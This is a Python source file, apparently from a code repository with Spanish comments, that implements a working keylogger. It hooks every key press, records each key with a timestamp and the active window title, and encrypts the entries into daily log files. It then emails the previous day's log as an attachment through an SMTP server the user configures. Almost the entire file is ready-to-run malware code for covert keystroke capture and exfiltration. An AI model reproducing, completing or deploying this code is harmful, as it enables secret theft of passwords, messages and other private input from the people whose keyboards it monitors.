import os
import logging
from datetime import datetime
import keyboard
from crypto_utils import get_or_create_key, encrypt_data
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuración (rellenar con tus datos, obviamente no voy a subir los mios a github)
LOGS_DIR = os.path.join(os.path.dirname(__file__), "logs")
EMAIL_FROM = "tu_correo@example.com"
EMAIL_TO = "destinatario@example.com"
EMAIL_SUBJECT = "Log del keylogger"
SMTP_SERVER = "smtp.example.com"
SMTP_PORT = 587
SMTP_USER = "tu_correo@example.com"
SMTP_PASSWORD = "tu_contraseña"
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)
key, _ = get_or_create_key()

def get_active_window():
    """ Obtiene la ventana activa actual """
    if os.name == 'nt':  # Windows
        try:
            import pygetwindow as gw
            window = gw.getActiveWindow()
            return window.title if window else "Desconocido"
        except Exception as e:
            logging.error(f"Error obteniendo ventana: {e}")
            return "Error obteniendo ventana"
    else:
        return "No soportado en Linux"

def get_log_file():
    """ Genera un archivo nuevo por día """
    today = datetime.now().strftime('%Y-%m-%d')
    return os.path.join(LOGS_DIR, f"log_{today}.log")

def send_email(file_path):
    """ Envía un correo electrónico con el archivo adjunto """
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        msg['Subject'] = EMAIL_SUBJECT

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(file_path, 'rb').read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
        server.quit()
    except Exception as e:
        logging.error(f"Error enviando correo: {e}")

def log_key(event):
    """ Registra teclas presionadas y la ventana en la que se escribieron """
    try:
        key_str = event.name  # Tecla presionada

        window = get_active_window()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_entry = f"{timestamp} | {window} | {key_str}\n"
        
        encrypted_entry = encrypt_data(log_entry, key)  # Cifrar registro

        log_file_path = get_log_file()
        if not os.path.exists(log_file_path):
            log_files = [os.path.join(LOGS_DIR, f) for f in os.listdir(LOGS_DIR)]
            if log_files:
                previous_log_file = max(log_files, key=os.path.getctime)
                if previous_log_file != log_file_path:
                    send_email(previous_log_file)

        with open(log_file_path, "a") as log_file:
            log_file.write(encrypted_entry + "\n")  # Guardar en archivo
    except Exception as e:
        logging.error(f"Error in log_key: {e}")

if __name__ == "__main__":
    logging.basicConfig(filename='keylogger_error.log', level=logging.DEBUG)
    logging.debug("Starting keylogger")
    try:
        keyboard.on_press(log_key)
        keyboard.wait()
    except Exception as e:
        logging.error(f"Unhandled exception: {e}")
    logging.debug("Keylogger stopped")